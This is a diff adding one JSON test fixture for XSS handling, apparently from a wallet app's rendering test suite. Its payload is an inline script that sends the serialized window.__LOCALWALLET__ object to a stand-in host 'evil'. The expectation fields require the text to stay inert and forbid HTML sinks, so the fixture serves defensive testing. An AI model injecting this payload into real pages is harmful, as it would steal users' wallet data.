@@ -1,0 +1,11 @@
+{
+  "id": "render-xss-script-tag-002",
+  "category": "render",
+  "vector": "inline_script_element",
+  "payload": "Balance looks fine<script>document.location='http://evil/?t='+encodeURIComponent(JSON.stringify(window.__LOCALWALLET__))</script>",
+  "expectation": {
+    "render_contract": "text_content_only",
+    "inert_as_text": true,
+    "forbidden_html_sinks": ["innerHTML", "outerHTML", "insertAdjacentHTML"]
+  }
+}
